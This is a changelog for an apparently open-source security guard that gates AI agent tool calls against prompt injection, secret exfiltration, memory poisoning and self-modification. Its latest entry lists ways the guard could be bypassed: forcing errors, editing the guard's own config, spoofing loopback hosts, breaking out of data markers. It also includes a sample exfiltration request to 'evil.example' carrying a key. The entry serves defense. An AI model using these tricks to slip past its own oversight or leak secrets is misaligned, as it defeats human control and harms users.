# Changelog

All notable changes to this project are documented here.
The format is based on [Keep a Changelog](https://keepachangelog.com/), and this
project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

Closes two ways of getting past the guard without beating any rule, found in a
security review of 0.3.0. Ordinary work is unaffected: every existing test,
including `test_availability.py`, passes unchanged.

### Security

- **An evaluation that raises is no longer a way around a denial.** A
  JSON-object `payload`, a non-string `target`, or `metadata` that is not a
  mapping made the evaluation raise, and the error path then allowed the call
  (`GUARD_DEGRADED_ALLOWED`): an `http_post` carrying a secret was denied as a
  string and allowed as a dict. Fields are now normalized before evaluation,
  and tool arguments passed as a JSON string are parsed.
- **A failed audit write no longer discards the decision.** The SQLite
  connection was bound to the thread that opened it, so in a host calling from
  worker threads every audited decision raised after it was made, turning
  `deny` into `allow`. The audit log is now usable from any thread, and a
  failed write is logged and counted (`GuardAdapter.audit_failures`) instead of
  replacing the decision.
- **Policy is no longer read from the working directory.** `guard.yaml` in the
  agent's workspace was loaded first, so a cloned repository (or the agent
  itself) could set `mode: monitor`, and a deliberately broken file dropped the
  guard into its error path. The plugin now reads
  `/etc/agent-security-guard/guard.yaml`, `~/.hermes/guard.yaml`, or the copy
  shipped next to it, and logs a warning while a working-directory file is
  being ignored.
- **`AGENT_SECURITY_GUARD_MODE` is read once, at startup.** It was read on
  every evaluation, so any code in the process could switch a running guard to
  `monitor`. Set it and restart the host.
- **The hard rules now hold under the names hosts give their tools.** The kind
  table knew `shell` but not `bash`, `terminal`, or `execute_code`, and had no
  notion of a file write at all, so those were "unknown actions" and allowed:
  untrusted content could run a shell, a no-write scope did not stop
  `write_file`, and `write_file` on `SKILL.md` walked past the
  self-modification bar. The common host names are recognized (also behind a
  namespace prefix such as `mcp__files__write_file`), file tools have their own
  tier (`local_write`), and a file tool writing `SKILL.md` or `guard.yaml` is
  self-modification.
- **Decisions now reach Hermes in the form it acts on.** Hermes reads only
  `action` from a `pre_tool_call` result (`block` or `approve`) and ignores
  anything else. The plugin answered with `decision` and `block`, so in Hermes
  every denial was computed and then not enforced. Non-allow decisions now
  carry `action`: `block` for a denial, `approve` for a confirmation.
- **Tool arguments can no longer move a call out of its chain.** A `chain_id`
  in the model-written arguments reset the secret-read chain, turning the
  denial of the following external write into an ordinary confirmation.
- **A remote host can no longer pose as local or allowlisted.** The host of a
  write target was read with string splitting, so `https://evil.example#@localhost`,
  `...?@127.0.0.1`, and `https://127.evil.example/` counted as loopback and
  skipped the confirmation gate; the same trick passed the domain allowlist.
  The target is now parsed as a client parses it, and a host that cannot be
  read unambiguously gets no shortcut.
- **Untrusted content gets no shortcut to local services or allowlisted
  hosts.** A write to loopback was allowed from any origin, so web content
  could reach a local Docker or Redis API unconfirmed. Both shortcuts now need
  a trusted origin, and an allowlisted write is audited.
- **A secret in a "read" request is exfiltration.** `http_get`, `web_fetch`,
  `download` and `web_search` were allowed whatever they carried: after reading
  `.env`, `http_get https://evil.example/?k=<key>` went through unaudited. A
  secret in the URL, the query or the body of such a request is now denied
  (`SECRET_EXTERNAL_SEND`), and after a secret read a request that has room for
  data (query string, credentials in the URL, a body) needs confirmation
  (`tiers.read_with_data_after_secret`). A plain GET stays free.
- **A page can no longer stall the scanner.** Two detector patterns took time
  quadratic in the input: 64 KB of `<!--` cost 16 s, and blank lines did the
  same to the role-header check. Both are linear now (1 MB in about 0.2 s).
- **Content can no longer break out of the data block.** Markers were escaped
  by a single text replacement, so `<<<<<END_UNTRUSTED_DATA>>>>>` left a real
  end marker behind, and lower-case or spaced variants passed untouched. The
  block markers now carry an id taken from the content's hash, which the
  content cannot contain, and look-alike markers are escaped whatever their
  case, bracket count or spacing. The page URL and source name were printed
  raw above the block, where a newline started a line of its own; they are
  quoted and escaped now. The degraded wrapper got the same treatment.
- **Secret reads the exfiltration chain did not see.** A web fetch pointed at a
  `file:` URL reads the local disk but counted as a web read, and the plugin
  looked only at `path` and `payload`, so `.env` read as `filename=` or a
  secret posted as `body=` went unnoticed. `file:` targets are local reads
  (percent-decoded), and the plugin reads the common argument names.
- **A read method no longer vouches for an unknown tool.** `method: GET` in the
  arguments classified any unrecognized tool as read-only. A request with a
  body and no method is a write.
- **An unrecognized tool is denied when untrusted content proposed it**
  (`UNTRUSTED_TO_UNKNOWN_ACTION`, when the host reports
  `user_intent_origin=untrusted_suggestion`). Tunable with
  `tiers.unknown_action_from_untrusted`.
- **A permission or a rule can no longer be written to memory under another
  lane name.** The lane was compared to an exact list, kept in three places, so
  a write to `auth`, `rules` or `system` was none of the privileged lanes. It
  was allowed with the message "quarantined to evidence" while it went to the
  lane it asked for. The lane is now read in one place: other spellings of
  `authorization` and `procedural` are denied from untrusted sources like the
  names themselves, in the policy, the sequence guard and the memory bridge.
- **A memory write that names no lane is no longer taken for evidence.** No
  lane, or a name the guard cannot read, is denied from an untrusted source
  (`UNTRUSTED_TO_UNKNOWN_MEMORY_LANE`, `tiers.memory_external_to_unknown_lane`)
  and asked about once outside content was read in the chain.
- **Leaving the source out no longer opens the privileged lanes.** A write to
  `authorization` or `procedural` memory with no `memory_source`, on a trusted
  or unspecified origin, was a plain allow and left no audit record. The user
  is asked now (`PRIVILEGED_MEMORY_REQUIRES_CONFIRMATION`,
  `tiers.memory_unsourced_to_privileged`), and such a write from `observation`
  is audited.
- **The lane of a host's memory tool reaches the rules.** For a call that
  arrives as `tool_name` + `args`, as Hermes sends it, the plugin dropped the
  lane and the source, so every such write was judged as an evidence write. It
  reads them now (`lane`, `memory_lane`, `desired_memory_lane`; `source`,
  `memory_source`). A source in the arguments is the model's own claim:
  `observation` there unlocks nothing, and two different lanes in one call do
  not pass as the harmless one. In Hermes an approval of a privileged memory
  write covers that exact write only.
- **The memory bridge no longer trusts a source it has no entry for.** Only
  `tool`, `external` and `inference` counted as untrusted, so a preference
  "from `web`" was allowed. Anything but `observation` and `conversation` is
  untrusted now.

### Changed

- **`on_error: degrade` now also blocks state-changing kinds** (external
  write, memory write, config change, download, ...) while the engine cannot
  evaluate, not only kinds dangerous by name. Reads and unrecognized host tools
  keep working, as before. `monitor` mode never blocks, in the error path too.
- **A `guard.yaml` that cannot be parsed no longer disables evaluation.** The
  engine keeps running on the built-in defaults and its decisions carry
  `config_error`. `on_error` from a config that did load is honored when the
  adapter cannot be built.
- A broken install (package not importable) now reaches the degraded decision
  instead of raising `NameError` from the hook.
- **In Hermes, a self-modification without a stated user order is sent to the
  approval prompt** (`action: approve`, `rule_key` bound to the exact call)
  instead of being vetoed, because Hermes cannot tell the guard who asked. From
  untrusted content it is still vetoed.
- **One Hermes turn is one chain:** `turn_id` is used as `chain_id` when the
  host passes no chain of its own, which also keeps sessions apart.
- With `scope_from_text`, the plugin reads the no-write scope from the user
  message Hermes gives `pre_llm_call`; only the two resulting flags are kept.
- **Untrusted content writing `preference` memory is asked about**
  (`UNTRUSTED_TO_PREFERENCE_MEMORY`), like `identity`. It was allowed with a
  warning that claimed a quarantine nothing carried out.
- **`memory_source: conversation` may write `identity`, `preference` and
  `evidence` without a prompt** on a trusted origin, as the memory bridge
  already advised. The policy counted every source but `observation` as
  untrusted, so stating where a fact came from made the write stricter than
  stating nothing. The privileged lanes still take `observation` only.
- A memory write that names no lane, or one the guard does not know, is
  `allow_with_warning` on a trusted origin (`UNKNOWN_MEMORY_LANE_AUDITED`)
  where it was a plain, unaudited `allow`.
- **Recognizing a host tool does not gate it more.** On a trusted or
  unspecified origin with nothing pointing at danger, `terminal`, `write_file`
  and the like are allowed and audited as they were while unrecognized
  (`HOST_TOOL_AUDITED`, `LOCAL_WRITE_AUDITED`). What is new for a host that
  passes no provenance: `skill_manage` and file writes to `SKILL.md` or
  `guard.yaml` are denied without an explicit user order, like `skill_patch`
  always was, and recognized tools are blocked while the engine cannot evaluate.

### Added

- **Asks before a state change once outside content was read.** After a web,
  search or browser tool ran in the chain (`untrusted_content_tools`, or any
  read of a remote URL), a shell command, file write, install, config change,
  external write or self-modification needs confirmation
  (`UNTRUSTED_CONTENT_IN_CONTEXT`). This is the case the origin-based rules
  miss: the user asks for a page and the page proposes the next action. Reads
  and unrecognized tools stay free; an action the host reports as explicitly
  ordered by the user is exempt; `tiers.after_untrusted_content` tunes it
  (`allow_with_warning` records it without asking).
- **Web content is wrapped as data in Hermes.** The plugin registers
  `transform_tool_result` and returns the result of a web, search or browser
  tool as a data-only block, uncut. `wrap_tool_results: false` switches it
  off; `monitor` mode does not wrap.
- `guard_status()` reports `config_error`, `mode`, and `mode_source`.
- `tool_tiers` in guard.yaml: declare the tier of your host's own tools. Wins
  over the built-in tables; a misspelled tier fails loudly.
- `memory_lanes` in guard.yaml: map your memory's own lane names to the lane
  they amount to. A misspelled lane fails loudly, and the five built-in lanes
  cannot be redefined.
- **A host's memory tool is recognized as a memory write** (`memory` in
  Hermes, `save_memory`, `add_memory`, `store_memory`, `update_memory`,
  `memory_add`, `memory_save`, `memory_store`, `memory_update`, also behind a
  namespace prefix). Hermes puts what `memory` stores into every later turn, so
  a line written there at a page's suggestion outlives the turn. Such a call
  names no lane: it is asked about once outside content was read in the chain
  (`UNTRUSTED_CONTENT_IN_CONTEXT`, tuned by `tiers.after_untrusted_content`),
  denied when untrusted content proposed it or the origin is untrusted, covered
  by a no-write scope, and blocked while the engine cannot evaluate. On a
  trusted or unspecified origin with nothing from outside in the chain it is
  allowed and audited, as it was while unrecognized; `strict` mode still asks
  (`MEMORY_WRITE_REQUIRES_CONFIRMATION`). Memory reads (`memory_search`,
  `memory_get`) stay unrecognized and free. `tool_tiers: {memory: unknown}`
  takes a tool out of the rules again. This changes two cases
  `test_availability.py` used to hold (`memory` unrecognized, and free after a
  web read), on the owner's decision.
- `self_modification_paths`, and the tier settings `local_write`,
  `recognized_host_tool`, `unknown_action_from_untrusted`.
- `normalize_action`, `mode_with_source`, `GuardAdapter.mode_source`,
  `GuardContext.mode_resolved`.
- Tests: threat class 8 ("neutralizing the guard") and the host-tool-name
  cases in `test_threat_regression.py`, with the matching availability checks.

## [0.3.0] - 2026-08-30

**Fixes a critical over-blocking regression.** In a live host, 0.2.x denied
almost everything — including the host's own operations. No dashboard, no data
reads, and no way to loosen the policy short of uninstalling the guard. A
security control that takes the agent down is an outage, not a control.

Every security guarantee from 0.1.0/0.2.0 still holds (`test_threat_regression.py`
and the self-modification bar are unchanged and green). What changed is the
default posture on everything that was *not* a recognized attack path.

### Fixed

- **Unrecognized tool kinds are no longer blocked.** The kind table only knows
  ~40 names, so a host forwarding its own tools (`list_dir`, `dashboard_query`,
  `sqlite_query`, ...) got `require_confirmation` — which hosts enforce as
  blocked — for every single call. Unknown kinds are now allowed and audited
  (`UNKNOWN_ACTION_AUDITED`); only `strict` mode stops to ask.
- **`mode` and `tiers` in guard.yaml were dead configuration.** The policy
  hardcoded every decision and never read them, so there was no escape hatch.
  Both are now enforced, plus the new `on_error`, `scope_from_text`, and
  `limits.chain_window`.
- **One ordinary read no longer poisons the session.** `*.db`, `*.sqlite`,
  `*.log`, `logs/`, `backups/`, `settings.json`, `config.py`,
  `docker-compose.yml`, `auth.*`, and `token.*` shipped as `sensitive_paths`, so
  reading a normal project file counted as a secret read and then denied *every*
  external write for the rest of the session (`SECRET_THEN_EXFIL`). The list is
  now real secret material only, and an unbounded session is no longer treated
  as one chain (`chain_window`, default 12).
- **Credential *mentions* are no longer secrets.** `(?i)api[_-]?key` and
  `(?i)password\s*[:=]` matched any text discussing credentials. Patterns now
  require a credential value, and cover `gh*_`, `sk-`, and Slack tokens.
- **A missing provenance kwarg is no longer "untrusted".** `origin_trust`
  defaulted to `UNKNOWN`, which is untrusted, so a host that simply did not pass
  the kwarg had all shell, install, and config actions hard-denied. New
  `OriginTrust.UNSPECIFIED` (not untrusted) means "the host stated nothing";
  `UNKNOWN` keeps meaning "examined and unestablished" and stays untrusted.
- **Everyday wording no longer creates a no-write scope.** Scope inference from
  raw user text is now opt-in (`scope_from_text`, default off): a bare "ok" was
  read as an ambiguous confirmation and "nur lesen" as a no-write scope, and both
  denied every state-changing action in the turn. When enabled, matching is
  clause-anchored.
- **The guard's own failure is no longer an outage.** An unreadable config or
  unwritable audit file made `pre_tool_call` answer `deny` for every call.
  Audit failure now degrades to running without audit, and an unavailable engine
  blocks only kinds that are dangerous by name (`GUARD_DEGRADED_DANGEROUS_KIND`)
  while letting ordinary operations through, flagged `degraded`. Set
  `on_error: deny_all` for the previous hard fail-closed behaviour.
- **Loopback writes are not exfiltration.** POSTs to `localhost`/`127.0.0.1`/
  `[::1]` no longer need a per-call confirmation (secret payloads and the
  secret-read chain still apply). Also fixes IPv6 host parsing in
  `_extract_host`, which mangled bracketed addresses.
- `domain_allowlist` is now actually honoured for external writes.

### Added

- `monitor` mode and `agent_security_guard.modes`: never blocks, and records what
  a blocking mode *would* have done in `advisory_decision` /
  `advisory_reason_code` (also exposed as `enforced` in the decision dict). The
  recommended way to introduce the guard into a live host.
- `AGENT_SECURITY_GUARD_MODE` env override (accepts `off`/`monitor`/`report`) as
  a kill switch that needs no file edits.
- `tests/test_availability.py`: 51 tests that assert the host keeps working —
  the counterweight to the threat regressions. 246 tests total.

### Changed

- The plugin resolves `guard.yaml` from the cwd, `~/.hermes/`, and the plugin
  directory instead of a bare relative path.

## [0.2.0] - 2026-06-28

Self-modification governance: close the unauthorized self-improvement / skill
patch hole, where the agent could rewrite its own `SKILL.md` / procedural rules
without an explicit user order, off a bare "yes", or even under an explicit
no-write scope.

### Added

- **`ActionTier.SELF_MODIFICATION`** for skill patch/create/delete/edit,
  self-improvement, and procedural-rule approve/retire. It is **never a direct
  allow** — at most `require_confirmation`. (`skill_install` stays `INSTALL`.)
- **User-scope gates** that run before any per-tier rule for every
  state-changing action:
  - explicit no-write scope (`no_write_scope_active`) →
    `EXPLICIT_NO_WRITE_SCOPE_VIOLATION`;
  - ambiguous short confirmation (`short_confirmation`) without a prior explicit
    authorization → `SHORT_CONFIRMATION_NO_PRIOR_AUTH`, or from a non-user source
    → `SHORT_CONFIRMATION_NONAUTHORITATIVE_SOURCE`.
- Four `GuardContext` fields: `no_write_scope_active`, `short_confirmation`,
  `previous_action_was_explicitly_authorized`,
  `requested_action_from_nonuser_context` (all default to the safe value, so the
  gates only ever add denials).
- **Two-phase, hash-bound self-improvement gate**
  (`agent_security_guard.self_improvement`): `propose` evaluates and writes
  nothing; `confirm` writes only on a matching `action_hash`, a real
  confirmation, no active no-write scope, non-`nonuser` provenance, and a
  non-`deny` final check. Fail-closed on guard error / hash mismatch.
- Conservative DE+EN text helpers `detect_no_write_scope` /
  `is_short_confirmation` for hosts that can only pass a raw `user_message`.
- New reason codes: `SELF_MODIFICATION_REQUIRES_EXPLICIT_USER_ORDER`,
  `SELF_MODIFICATION_REQUIRES_EXPLICIT_TARGET`,
  `SELF_MODIFICATION_REQUIRES_CONFIRMATION`, plus the three scope codes above.
- Host-integration contract: [references/self-modification.md](security/agent-security-guard/references/self-modification.md);
  threat class 7 added to the threat model.

### Changed

- `GuardAdapter.guard_action` accepts an `event_type` keyword so self-improvement
  decisions are audited as `self_improvement` (block reasons are logged).
- Plugin `pre_tool_call` reads the new scope kwargs (`no_write_scope`,
  `short_confirmation`, `previous_action_authorized`,
  `action_from_nonuser_context`) and falls back to the text helpers from
  `user_message`.

### Tests

- 28 new tests (180 total), including `tests/test_self_improvement_e2e.py`: under
  a no-write scope and under an ambiguous short confirmation a real
  `self_improvement_patch` is denied and the target `SKILL.md` stays
  byte-identical; the two-phase positive writes while hash mismatch and bare-yes
  confirm do not.

## [0.1.0] - 2026-06-22

First public release. Feature-complete across five sprints (see the per-sprint
notes below), followed by a Bugbot + security-review hardening pass.

### Added

- Deterministic transition policy engine for Hermes/OpenClaw agents:
  - Two independent axes — `OriginTrust` (instruction authority) and
    `DataSensitivity` (leakage risk).
  - Action classification into tiers and a hard-rule decision matrix
    (`check_action`).
  - Content scanner + boundary wrapper that renders untrusted content as
    **data, not instructions** (`scan_input`, `wrap_untrusted`).
  - Kill-chain detection across an action history (`check_sequence`):
    secret read → external post, download → execute, web → shell,
    untrusted → privileged memory.
  - Advice-only memory bridge (`advise_memory_write`) that never mutates memory.
  - SQLite/JSONL audit log (`AuditLog`, `record_event`).
  - `GuardAdapter` per-session facade, a `python -m agent_security_guard` CLI,
    and a Hermes/OpenClaw plugin (`pre_llm_call`, `pre_tool_call`).
- Packaging: `pyproject.toml` (pip-installable, `agent-security-guard` CLI
  entry point) and a full [installation guide](docs/INSTALLATION.md).

### Security (review hardening)

- **Exfiltration chain under default integration:** `GuardAdapter.guard_action`
  now derives `DataSensitivity` from the action target path and payload, and a
  sensitive-or-higher local read maps to `SECRET_READ`. The
  `secret read → external post` kill chain now hard-denies even when the host
  omits `data_sensitivity`.
- **Fail-closed plugin hooks:** `pre_tool_call` returns an explicit `deny`
  (new `reason_code=GUARD_UNAVAILABLE`, `block=True`) when the guard is
  unavailable or raises; `pre_llm_call` substitutes a degraded-but-safe wrapper
  instead of dropping untrusted content. Previously these returned `None`,
  which an enforcing host could read as approval.
- **Unambiguous enforcement flags:** the decision payload now sets `block` for
  **any** non-allow outcome (incl. `require_confirmation` / `transform`) and
  adds explicit `allowed` and `requires_confirmation` flags. A host that checks
  only `block` now fails safe.
- **Laundered confirmations denied:** a bare "yes" (`HUMAN_CONFIRMATION`) to a
  suggestion from an untrusted origin is now denied with
  `CONFIRMATION_ORIGIN_UNTRUSTED`, closing the social-engineering relay.
- **Complete boundary neutralization:** the wrapper now neutralizes the
  human-readable header/footer markers (`[UNTRUSTED CONTENT - DATA ONLY]`,
  `[END UNTRUSTED CONTENT]`) in addition to the `<<<…>>>` delimiters, so
  untrusted content cannot forge an early block boundary.

### Tests

- 152 passing (143 from the sprints + 9 regression tests covering the hardening
  fixes above), across Python 3.8 / 3.11 / 3.13.

---

## Sprint history

### Sprint 1 — Types + Policy Core

- Project scaffold: stdlib-only Python package, `guard.yaml`, SKILL.md, CI, MIT license.
- `types.py`: enums `Decision`, `ReasonCode`, `ActionTier`, `OriginTrust`,
  `DataSensitivity`, `UserIntentOrigin`; dataclasses `GuardConfig`,
  `GuardContext`, `AgentAction`, `GuardDecision`, `GuardReport`,
  `ContentClassification`, `MemoryAdvice`, `GuardEvent`.
- `_miniyaml.py`: conservative stdlib YAML-subset loader (fails loud on
  unsupported constructs).
- `policy.py`: `DEFAULT_CONFIG`, `load_config`, predicates
  (`path_is_sensitive`, `domain_allowed`), and the deterministic
  `decide_action` hard-rule matrix.
- `actions.py`: `classify_action` (kind/method -> `ActionTier`, fail-safe to
  `UNKNOWN`).
- `action_guard.py`: thin `check_action` wrapper with deterministic risk score.
- Tests: 54 passing across mini-YAML, action classification, policy matrix,
  predicates, config loading, and the end-to-end action guard.

### Sprint 2 — Scanner + Envelope + Wrapper

- `types.py`: added `UntrustedEnvelope` (provenance container) and redefined
  `GuardReport` to embed the envelope, classification, and clipped content.
- `patterns.py`: compiled `INJECTION_PATTERNS` and `EXECUTABLE_PATTERNS` banks,
  `scan_patterns`, and `compile_patterns` (config secret regexes, skips invalid).
- `envelope.py`: `resolve_origin_trust` with `source_kind` inheritance (web-fetch
  tool -> `external_web`, calculator -> `trusted_tool_output`, grep ->
  `local_project`), fail-safe to `UNKNOWN`.
- `scanner.py`: `classify_content` (origin trust + data sensitivity + indicator
  lists; content secrets dominate path hints) and `scan_input` (provenance
  envelope, sha256, content clipping, bounded deterministic risk score).
- `wrapper.py`: `wrap_untrusted` boundary block with provenance, data-only
  notice, delimiter-breakout neutralization, and truncation notice.
- Fixtures: `tests/fixtures/injection_corpus.json` (injection / executable /
  secret / benign cases).
- Tests: 33 new (87 total) across envelope resolution, scanner corpus,
  sensitivity escalation, risk bounds, and wrapper behavior.

### Sprint 3 — Sequence + Audit

- `types.py`: added `HistoryEntry`, `chain_id` on `GuardContext`, and
  `GuardEvent.to_dict`.
- `sequence_guard.py`: `SequenceCategory`, `derive_category`, bounded
  `ActionHistory`, and `check_sequence` kill-chain rules (strictest wins):
  `secret read -> external write` (deny, survives an intervening summarize),
  `download -> execute` (untrusted deny / user confirm), `web read -> shell`
  (deny), `web read -> authorization/procedural memory` (deny; evidence ->
  warn). Chains are isolated by `chain_id`.
- `audit.py`: `AuditLog` over SQLite (fixed `events` schema) and/or JSONL,
  `record_event`, `build_event` (action/context -> event with sha256
  `action_hash`), and `last(n)` newest-first.
- Tests: 18 new (105 total) across category derivation, all kill chains,
  chain isolation, history bounding, and SQLite/JSONL audit roundtrips.

### Sprint 4 — Memory Bridge + Plugin Adapter

- `memory_bridge.py`: `advise_memory_write` lane/source matrix mapping to the
  agent-memory Authority Lanes (advice-only; never touches memory). External/
  tool -> evidence; never authorization/procedural; identity only with
  observation; content note when secrets/injection are present.
- `adapter.py`: `GuardAdapter` per-session facade — `guard_input` (scan+wrap),
  `guard_action` (action policy + sequence policy, stricter wins, history +
  audit), and `advise_memory`.
- `__main__.py`: CLI with `scan`, `check-action --json`, and `audit --last N`.
- `plugin/__init__.py` + `plugin/plugin.yaml`: Hermes/OpenClaw plugin with
  `register(ctx)` wiring `pre_llm_call` (wrap untrusted items) and
  `pre_tool_call` (evaluate planned action, return machine-readable decision
  with a `block` flag). Hooks never raise.
- Tests: 27 new (132 total) across the memory bridge matrix, adapter
  stricter-decision logic, dummy-host plugin hooks, and CLI commands.

### Sprint 5 — Docs + Threat Regression

- `references/threat-model.md`: the six OpenClaw threat classes mapped to
  defenses and reason codes; the two-axis model; the confirmation-origin rule.
- `references/architecture.md`: design rationale, decision pipeline diagram,
  and module map.
- `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`.
- `tests/test_threat_regression.py`: 11 tests mapping each threat class
  (goal hijacking, memory rule injection, workflow drift, tool manipulation,
  supply-chain instruction, unexpected code execution) to a concrete guard
  outcome, plus the "reading stays free" autonomy guarantee.
- Tests: 11 new (**143 total**). v0.1.0 feature-complete.
